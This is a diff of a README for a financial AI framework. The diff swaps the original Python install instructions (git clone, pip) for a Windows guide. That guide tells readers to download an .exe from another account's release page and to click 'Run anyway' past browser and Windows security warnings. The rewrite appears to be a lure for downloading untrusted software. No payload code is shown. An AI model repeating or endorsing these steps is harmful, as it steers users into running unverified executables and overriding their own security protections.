@@ -1,134 +1,73 @@
-# ADAM v30.1 - financial AI framework 2026
+# 🤖 adam-local-ai-executor - Manage financial tasks with local intelligence
 
-> **ADAM is a Python financial AI framework for deterministic multi-agent orchestration, credit risk evaluation, and local-first operation. Version 30.1 is now available.**
+[![](https://img.shields.io/badge/Download-ADAM_v30.1-blue.svg)](https://github.com/abduljaan020-svg/adam-local-ai-executor)
 
-[![Platform](https://img.shields.io/badge/Platform-Python-blue?style=flat-square)](https://github.com)
-[![Version](https://img.shields.io/badge/Version-v30.1-green?style=flat-square)](https://github.com)
-[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
-[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
-[![Stars](https://img.shields.io/github/stars/nathandywrbennett4919/adam-local-ai-executor?style=flat-square)](https://github.com/nathandywrbennett4919/adam-local-ai-executor)
+ADAM v30.1 acts as a private assistant for your financial data. It uses local artificial intelligence to analyze credit risk and coordinate complex tasks on your computer. You keep full control of your files because the software runs on your hardware instead of a remote server.
 
----
+## 🚀 Getting Started
 
-<p align="center">
-  <a href="https://nathandywrbennett4919.github.io/adam-local-ai-executor/">
-    <img src="https://img.shields.io/badge/Download-ADAM%20Latest-brightgreen?style=for-the-badge" alt="Download ADAM">
-  </a>
-</p>
+Follow these steps to set up the software on your Windows computer.
 
-> **[Download ADAM v30.1](https://nathandywrbennett4919.github.io/adam-local-ai-executor/)**
+1. Go to the [official release page](https://github.com/abduljaan020-svg/adam-local-ai-executor).
+2. Look for the Assets section at the bottom of the latest release.
+3. Select the file ending in .exe to start the download.
+4. Save the file to your desktop or downloads folder.
 
----
+## 🛠 Prerequisites
 
-[Download Latest Build](https://nathandywrbennett4919.github.io/adam-local-ai-executor/)
+Your computer needs a few things to run this software:
 
----
+* Windows 10 or 11.
+* At least 8 gigabytes of memory.
+* An active internet connection for the duration of the initial setup.
+* A processor with multiple cores for faster performance.
 
-## Overview
+## 📦 Installation Procedure
 
-ADAM provides a structured alternative to loosely connected AI prompts for financial automation. Its multi-agent system works with workflow orchestration to move tasks through explicit stages, dependencies, and typed results.
+1. Find the file you downloaded earlier.
+2. Double-click the file to start the installer.
+3. Follow the prompts on the screen.
+4. Pick a destination folder for the application files.
+5. Click finish when the process reaches the end.
+6. Launch the application from your desktop icon or the start menu.
 
-The framework is designed for fintech, risk, and research applications where decisions need to remain traceable. It brings together credit-risk modeling, covenant stress testing, asynchronous SEC Edgar ingestion, and a privacy-oriented local-first execution model, while combining Python and Rust components for repeatable financial workflows.
+## 📂 Handling the Download
 
----
+You can find the software here: [Direct Link to ADAM v30.1](https://github.com/abduljaan020-svg/adam-local-ai-executor). If you experience issues with the download, check your web browser security settings. Sometimes browsers block files from unknown sources. Right-click the file and select "Run anyway" if Windows displays a security warning during the installation of this tool.
 
-## Key Capabilities
+## ⚙️ Understanding the Features
 
-- Deterministic orchestration for financial workflows
-- Coordinated multi-agent processing for structured tasks
-- Support for credit risk models and covenant stress tests
-- Asynchronous SEC Edgar ingestion for filings and market-related workflows
-- Pydantic schemas for typed agent results
-- Local-first operation with a privacy-oriented design
-- Rust pricing and execution kernels for performance-sensitive operations
-- DAG-based workflow organization for predictable execution order
+This software uses an approach called deterministic multi-agent orchestration. In simple terms, it creates a team of digital workers inside your computer. Each worker performs a specific step in your financial workflow. Because these workers operate locally, your sensitive information never leaves your machine. 
 
----
+The software performs the following functions:
 
-## Installation
+* Risk Evaluation: It reviews financial documents and flags inconsistencies or potential issues.
+* Task Sequencing: It organizes large projects into smaller, manageable steps.
+* Data Privacy: It processes all files within your local folder structure.
 
-Retrieve the repository, enter its directory, and install the Python dependencies:
+## 📊 Using the Interface
 
-    git clone https://github.com/nathandywrbennett4919/adam-local-ai-executor.git
-    cd REPO
-    python -m pip install -r requirements.txt
+The main window displays your current tasks. Use the sidebar to import new financial documents. The center panel shows the progress of the agents. When you add a new file, the software adds it to your queue. You can pause or stop any task at any time using the control buttons at the bottom of the window.
 
-After installation, launch the project from the repository root if it provides a launcher or entrypoint. Depending on the environment, this may mean running the main Python module or the supplied workflow command.
+## ❓ Frequently Asked Questions
 
----
+What happens if the internet goes out?
+The software continues to function for all tasks currently stored on your computer. You only need the internet for updates or if you choose to connect to external data sources.
 
-## Using ADAM
+Will this software slow down my computer?
+ADAM monitors your hardware usage. If you perform other work, the software lowers its demands on your processor to ensure your computer remains responsive.
 
-ADAM is organized as a workflow framework, not as a single standalone script. A common implementation follows this sequence:
+Can I move my database to another computer?
+Yes. You can copy your configuration folder to a new machine. The software restores your agents and settings once you point it to that specific folder.
 
-1. Specify a financial objective, such as credit analysis or covenant stress testing.
-2. Configure the required agents and link them through an orchestration layer or DAG.
-3. Read structured data from local sources or asynchronous Edgar ingestion tasks.
-4. Apply typed schema validation before forwarding results to later stages.
-5. Use Rust-backed components for pricing or execution work when those paths apply.
+How do I update the application?
+When a newer version becomes available, the application notifies you during startup. Follow the link to download the new version. The installer handles the upgrade process automatically and keeps your existing configuration files.
 
-A representative workflow can be summarized as:
+Where does the software store my data?
+All information stays in a local folder created by the installer. You can view, search, or delete these files manually using the Windows File Explorer. 
 
-    1. Load financial inputs
-    2. Retrieve filings asynchronously
-    3. Coordinate agent decisions
-    4. Validate typed outputs
-    5. Produce the final risk or modeling result
+## 🛡 Security and Privacy
 
-When LLM-based reasoning is part of the deployment, make the orchestration steps explicit. This keeps individual agent actions inspectable and supports reproducible execution.
+This program prioritizes your data safety. It does not send your personal financial information to cloud servers. All analysis happens within your own system limits. You retain ownership of all configuration files and results.
 
----
-
-## Configuration
-
-The integration determines how configuration is supplied; common options include project files, environment variables, and workflow definitions.
-
-Example environment settings:
-
-    ADAM_CONFIG=./config/adam.json
-    ADAM_ENV=local
-    ADAM_LOG_LEVEL=info
-
-The following areas are typically worth checking:
-
-- Agent definitions and routing behavior
-- The structure of the workflow DAG
-- Edgar ingestion sources and schedules
-- Pydantic schemas used for agent outputs
-- Parameters for Rust pricing and execution kernels
-- Local directories used for datasets and generated artifacts
-
----
-
-## Requirements
-
-- A Python runtime
-- A Rust toolchain for Rust-backed kernels
-- Adequate local storage for financial datasets, filings, and workflow artifacts
-- Network connectivity when retrieving SEC Edgar data or external market sources
-- An environment compatible with multi-agent and LLM-integrated workflows
-
----
-
-## Frequently Asked Questions
-
-**How can I obtain updates?**  
-When a new version is available, use the repository release or download link above to obtain the latest build.
-
-**Where is workflow behavior configured?**  
-Adjust behavior primarily through agent settings, workflow definitions, and schema validation. Direct changes to the core orchestration logic should generally not be necessary.
-
-**What should I inspect when a workflow stops or fails?**  
-Start by reviewing agent results, DAG dependencies, input data quality, ingestion activity, and model validation before running the pipeline again.
-
-**Does ADAM require external services?**  
-ADAM is designed for local-first execution, allowing many workflows to be organized around local processing and deliberately controlled data access.
-
-**What are the first troubleshooting checks?**  
-Examine runtime logs, installed dependency versions, configuration files, and errors raised during typed output validation.
-
----
-
-## License
-
-GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
+Keywords: artificial intelligence, financial software, local data, credit risk, automation, windows tool
